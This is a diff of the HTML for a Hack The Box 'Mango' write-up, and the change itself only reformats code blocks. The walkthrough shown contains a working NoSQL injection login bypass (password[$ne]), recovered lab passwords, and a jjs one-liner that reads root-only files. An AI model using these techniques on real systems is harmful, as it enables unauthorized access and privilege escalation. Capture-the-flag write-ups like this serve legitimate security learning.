@@ -92,8 +92,8 @@
 
 <h2 id="reconnaissance">Reconnaissance<a class="anchor" href="#reconnaissance">#</a></h2>
 <p>Let’s run nmap,</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.162
-</code></pre></div><p><img src="/htb/mango/nmap_initial_results.png" alt="nmap"></p>
+<pre><code>sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.162
+</code></pre><p><img src="/htb/mango/nmap_initial_results.png" alt="nmap"></p>
 <p>We have to use https for this website on port 80, and we can get this “search page”. We can see some kind of analytics page in the top right corner.</p>
 <p><img src="/htb/mango/mango_search_page.png" alt="page"></p>
 <p><img src="/htb/mango/mango_analytics_page.png" alt="page"></p>
@@ -114,10 +114,10 @@ staging-order.mango.htb</p>
 <p><img src="/htb/mango/request.png" alt="request"></p>
 <p>Edit the request:</p>
 <p>Before:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">username=admin&amp;password=test&amp;login=login
-</code></pre></div><p>After:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">username=admin&amp;password[$ne]=test&amp;login=login
-</code></pre></div><p>This will trick Mongo to check if the password doesn’t match and if it doesn’t it will let me in.</p>
+<pre><code>username=admin&amp;password=test&amp;login=login
+</code></pre><p>After:</p>
+<pre><code>username=admin&amp;password[$ne]=test&amp;login=login
+</code></pre><p>This will trick Mongo to check if the password doesn’t match and if it doesn’t it will let me in.</p>
 <p><img src="/htb/mango/request_reply.png" alt="reply"></p>
 <p><img src="/htb/mango/after_login.png" alt="afterlogin"></p>
 <h3 id="bruteforcing-the-password">Bruteforcing the password<a class="anchor" href="#bruteforcing-the-password">#</a></h3>
@@ -163,9 +163,9 @@ possible_chars <span style="color:#f92672">=</span> list(string<span style="colo
     get_password(u)
 </code></pre></div><p>This will run for some time, the output is:</p>
 <p><img src="/htb/mango/password_bruteforce.png" alt="success"></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">admin:t9KcS3&gt;!0B#2
+<pre><code>admin:t9KcS3&gt;!0B#2
 mango:h3mXK8RhU~f{]f5H
-</code></pre></div><p>I couldn&rsquo;t SSH into admin but I could SSH into mango, switch user to admin and cat user.txt.</p>
+</code></pre><p>I couldn&rsquo;t SSH into admin but I could SSH into mango, switch user to admin and cat user.txt.</p>
 <p><img src="/htb/mango/user_txt.png" alt="usertxt"></p>
 <h2 id="getting-root-account">Getting root account<a class="anchor" href="#getting-root-account">#</a></h2>
 <p>First, I switch from sh to bash by running /bin/bash.</p>
@@ -173,8 +173,8 @@ mango:h3mXK8RhU~f{]f5H
 <p><img src="/htb/mango/jjs.png" alt="jjs"></p>
 <h3 id="privilege-escalation-with-jjs">Privilege escalation with JJS<a class="anchor" href="#privilege-escalation-with-jjs">#</a></h3>
 <p>This is usually used for privilege escalation, so when you run jjs you get some sort of shell, let’s check GTFOBin if we can escape. There is a file read exploit so I’ll use that (note: you have to change the file name and remove the “newline symbols” ):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">echo &#39;var BufferedReader = Java.type(&#34;java.io.BufferedReader&#34;); var FileReader = Java.type(&#34;java.io.FileReader&#34;); var br = new BufferedReader(new FileReader(&#34;/root/root.txt&#34;)); while ((line = br.readLine()) != null) { print(line); }&#39; | jjs
-</code></pre></div><p><img src="/htb/mango/root_txt.png" alt="roottxt"></p>
+<pre><code>echo 'var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;); var FileReader = Java.type(&quot;java.io.FileReader&quot;); var br = new BufferedReader(new FileReader(&quot;/root/root.txt&quot;)); while ((line = br.readLine()) != null) { print(line); }' | jjs
+</code></pre><p><img src="/htb/mango/root_txt.png" alt="roottxt"></p>
 <p>Thanks for reading! Make sure to follow me on Twitter @ajdintrejic.</p>
 
 
